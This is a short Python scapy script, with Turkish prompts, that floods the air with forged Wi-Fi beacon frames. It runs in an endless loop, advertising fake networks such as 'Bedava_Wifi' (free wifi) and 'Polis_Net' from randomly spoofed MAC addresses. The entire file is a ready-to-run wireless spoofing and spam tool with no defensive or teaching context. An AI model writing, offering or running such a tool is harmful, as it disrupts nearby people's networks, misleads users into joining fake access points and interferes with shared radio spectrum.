from scapy.all import *
import random

print("--- WIFI BEACON FLOODER (SSID SPAM) ---")
iface = input("Wifi Arayüzü (Monitor Mod): ")

def random_mac():
    return "02:00:00:%02x:%02x:%02x" % (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))

ssid_list = ["Bedava_Wifi", "Polis_Net", "Hacklendin", "Virus_Net", "Girme_Yanarsin"]

print("🔥 SSID Spam Başlıyor...")
while True:
    for ssid in ssid_list:
        # Rastgele MAC'ten sahte yayın (Beacon)
        sender_mac = random_mac()
        dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=sender_mac, addr3=sender_mac)
        beacon = Dot11Beacon()
        essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
        
        frame = RadioTap()/dot11/beacon/essid
        sendp(frame, iface=iface, verbose=0)